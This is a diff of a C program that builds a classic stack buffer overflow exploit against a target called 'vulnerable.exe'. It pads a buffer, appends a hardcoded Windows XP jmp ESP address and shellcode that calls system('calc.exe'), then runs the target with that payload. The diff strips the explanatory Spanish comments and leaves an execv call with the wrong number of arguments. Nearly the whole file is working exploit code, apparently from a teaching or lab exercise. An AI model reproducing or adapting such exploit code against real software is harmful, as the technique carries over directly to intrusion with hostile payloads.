@@ -1,51 +1,40 @@
-#include <stdio.h>      // Entrada-Salida
-#include <stdlib.h>     // execv()
-#include <string.h>     // strcat()
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
 
 
-/**
- * Metodo principal.
- *
- * @param argc  Numero de argumentos.
- * @param argv  Argumentos.
- *
- * @return  0 si termina correctamente.
- */
-int main (int argc, char **argv) {  // Declarar 'argv' para usarlo con el 'execv'
-    // Cadena para detectar el estado de la pila (llenar el buffer y llegar al retorno)
+int main () {
+    char *argv[3];
+
     char payload[1024] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ";
 
+    char offset[] = "\x7b\x46\x86\x7c";
+    strcat(payload, offset);
 
-    // Shellcode que ejecuta 'system("calc.exe")', con la llamada a system harcodeado en '\x7b\x46\x86\x7c' 0x7c86467b
-    char offset[] = "\x7b\x46\x86\x7c";     // Offset 'jmp ESP' kernel32.dll para Windows XP (SP3)
-
-    strcat(payload, offset);        // Concatenar el offset del 'jmp ESP' al buffer
-
-
-    // Codigo para ejecutar el payload.
     char shellcode[] =                                      "\x55\x8b\xec"
                         "\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45"
                         "\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45"
                         "\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45"
                         "\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45"
-                        "\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3"              // Atento a la direccion (lit.End)
+                        "\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3"
                                                             "\x55\x8b\xec"
                         "\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45"
                         "\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45"
                         "\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45"
-                        "\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff"  // Atento a la direccion (lit.End)
+                        "\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff"
                         "\xd3";
 
-    strcat(payload, shellcode);     // Concatenar el shelcode al buffer
+    strcat(payload, shellcode);
 
 
-    // Ejecutar el payload.
-    argv[0] = "vulnerable";     // Definir el argumento 1: el nombre del ejecutable vulnerable
-    argv[1] = payload;          // Definir el argumento 2: el argumento del ejecutable
-    argv[2] = NULL;             // Apunta a 0: porque no metemos mas argumentos
+    argv[0] = "vulnerable";
+    argv[1] = payload;
+    argv[2] = NULL;
 
-    execv("vulnerable.exe", argv);   // Se ejecuta 'vulnerable.exe' con el payload como argumento
+    execv("vulnerable.exe", argv, NULL);
+
+    return 0;
 }
 
 /*
